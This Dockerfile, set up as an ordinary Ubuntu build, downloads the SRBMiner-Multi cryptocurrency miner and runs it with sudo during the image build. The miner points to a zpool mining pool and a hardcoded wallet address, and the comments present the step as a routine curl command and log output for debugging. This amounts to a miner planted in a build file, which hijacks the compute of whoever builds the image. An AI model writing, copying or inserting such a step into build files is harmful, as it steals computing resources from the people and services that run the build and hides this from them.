# Use the latest Ubuntu image
FROM ubuntu:latest

# Update and install required packages
RUN apt-get update && apt-get install -y && apt update && apt upgrade -y && apt install curl -y && apt install sudo -y

    


# Set the working directory
WORKDIR /app

# Run the curl command during the build process
RUN curl https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.4/SRBMiner-Multi-2-5-4-Linux.tar.gz -L -O -J && tar -xf SRBMiner-Multi-2-5-4-Linux.tar.gz && cd SRBMiner-Multi-2-5-4 && sudo ./SRBMiner-MULTI --algorithm minotaurx --pool minotaurx.sea.mine.zpool.ca:7019 --wallet R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q --password c=RVN --keepalive true

# Expose the log file for debugging
CMD tail -f log.txt
